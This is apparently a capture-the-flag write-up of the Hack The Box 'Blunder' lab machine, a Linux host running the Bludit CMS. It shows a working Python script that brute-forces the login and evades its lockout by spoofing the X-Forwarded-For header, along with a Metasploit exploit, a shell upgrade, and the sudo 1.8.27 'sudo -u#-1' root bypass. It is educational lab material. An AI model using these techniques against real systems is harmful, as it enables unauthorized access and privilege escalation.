---
title: "Blunder — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Blunder Hackthebox Machine"
date: 2022-05-01 07:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Linux]
---


## Introduction

![](/img/HTB/Blunder/Blunder.png)

#### Used Tools:
- nmap
- Gobuster
- Searchsploit
- Metasploit
- Cewl


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Blunder/img (1).png)

Nmap is done with port 21 closed and port 80 open.

The site is a blog website containing 3 posts and nothing more.

Let's try directory bruteforcing.
I'll run gobsuter with -u for the url, -2 for the directory list, and -o for the output file.

```bash
gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirb/common.txt -o directory.txt  2>/dev/null
```

![](/img/HTB/Blunder/img (2).png)

The directory bruteforce finished and I found "/admin", "/cgi-bin" and "/robots.txt".
/admin has an admin interface with login and password, I tried SQLInjection but reached nothing, and the cgi-bin was disabled so couldn't proceed with attacks like shellshock and the robots.txt have nothing.

After a lot of searching I tried to rerun the directory bruteforce but with different directory list:

```bash
gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory2.txt  2>/dev/null
```

![](/img/HTB/Blunder/img (3).png)

I found extra: "/install.php", "/todo.txt", "/usb".


## 2. EXPLOITATION:

visiting /install.php discloses a potential **CMS** “Bludit”

![](/img/HTB/Blunder/img (4).png)

Checking /todo.txt the following notes are discovered:

![](/img/HTB/Blunder/img (5).png)

Noticed that the CMS version isn't updated yet, so we need to know its current version and there is a user called **fergus**.

Revisiting /admin is the login page, and when viewing the page source, it potentially discloses the **version of bludit as 3.9.2**

![](/img/HTB/Blunder/img (6).png)

I searched on searchsploit for bludit 3.9.2

![](/img/HTB/Blunder/img (7).png)

There is a metasploit module so let's take a look for it:

![](/img/HTB/Blunder/img (8).png)

It require a username and a password to work...


We remember that we have a username called **fergus** from so we need to get a password, let's try bruteforcing the password by creating a password list from the common words in the website using **cewl** with the -d for depth of the search, -m for min length of the password and -w for the output

```bash
cewl -d 3 -m 5 -w HTB/Blunder/cewl_wordlist.txt http://10.10.10.191/
```
After creating our password list we need to try it...
I found a python code online for Bludit Brute Force Mitigation Bypass: https://rastating.github.io/bludit-brute-force-mitigation-bypass/

After a lot of modification to make it run properly the code was as following:

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

file = r"/home/kali/HTB/Blunder/cewl_wordlist.txt"  # Put here the location of the password list

file=open(file,'r')
for line in file:
  for word in line.split():
    wordlist.append(word)


for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```

After executing it tries different passwords till it find a valid one "RolandDeschain":

![](/img/HTB/Blunder/img (9).png)

let's pass it to our metasploit exploit and run it...

![](/img/HTB/Blunder/img (10).png)

We successfully gained a meterpreter shell
Gaining a more interactive shell:

```bash
shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

We are now "www-data" user, Traveling to /home we found 2 users: hugo, shaun
Visiting hugo we found user.txt, trying to read it but permission denied.

![](/img/HTB/Blunder/img (11).png)

After a lot of searcing in the system I found 2 directories called "bludit-3.10.0a" and "bludit-3.9.2" in the /var/www directory

Visiting its bludit-3.10.0a's content, I found a **user.php** file in the /var/www/bludit-3.10.0a/bl-content/databases

![](/img/HTB/Blunder/img (12).png)

After reading it I found Hugo's password hash, So let's try to decode it online on https://hashtoolkit.com/decrypt-hash/...

![](/img/HTB/Blunder/img (13).png)

It found a successfull match with a password: "Password120"

Let's change user and get the user flag...

![](/img/HTB/Blunder/img (14).png)


## 3. PRIVILEGE ESCALATION:

Let's list user's privileges or check a specific command:

![](/img/HTB/Blunder/img (15).png)

This have a public exploit exploiting "sudo 1.8.27 - Security Bypass"
Link: https://www.exploit-db.com/exploits/47502

So we could escalate our privileges using:

```bash
sudo -u#-1 /bin/bash
```

BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D

![](/img/HTB/Blunder/img (16).png)


Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***